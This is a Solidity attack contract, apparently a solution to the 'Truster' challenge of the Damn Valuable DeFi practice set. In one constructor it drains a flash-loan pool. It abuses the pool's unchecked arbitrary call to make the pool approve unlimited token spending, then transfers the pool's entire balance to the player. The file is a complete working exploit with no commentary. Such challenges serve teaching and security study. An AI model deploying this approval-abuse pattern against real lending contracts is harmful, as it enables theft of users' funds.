// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract AttackTruster {
    constructor(address _pool, address player) {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        DamnValuableToken token = pool.token();
        pool.flashLoan(0, address(this), address(token), abi.encodeCall(pool.token().approve, (address(this), type(uint256).max)));
        token.transferFrom(address(pool), address(player), token.balanceOf(address(pool)));
    }
}